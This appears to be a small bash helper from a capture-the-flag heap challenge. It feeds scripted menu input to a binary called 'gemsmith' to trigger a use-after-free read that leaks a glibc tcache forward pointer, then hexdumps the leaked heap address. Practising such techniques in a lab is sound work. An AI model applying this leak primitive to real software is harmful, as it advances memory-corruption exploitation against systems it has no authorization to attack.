#!/bin/bash
# Properly test tcache fd leak

echo "=== Testing tcache fd pointer leak ==="
echo "1. Alloc chunk 1"
echo "2. Delete chunk 1 (tcache has 1 entry, next=NULL)"
echo "3. Alloc chunk 2"
echo "4. Delete chunk 2 (tcache has 2 entries, chunk2->next=chunk1)"
echo "5. Show chunk 2 (UAF - should print chunk2 which contains pointer to chunk1)"
echo ""

# Ops: 1=alloc, 2=delete, 3=show
# We'll use 5 operations: alloc, del, alloc, del, show
cat << 'EOF' | timeout 2 ./gemsmith 2>&1 | hexdump -C | grep -A1 -B1 "0x\|55 55"
1
0
1000
CHUNK1
2
0
1
0
1000
CHUNK2
2
0
3
0
4
EOF
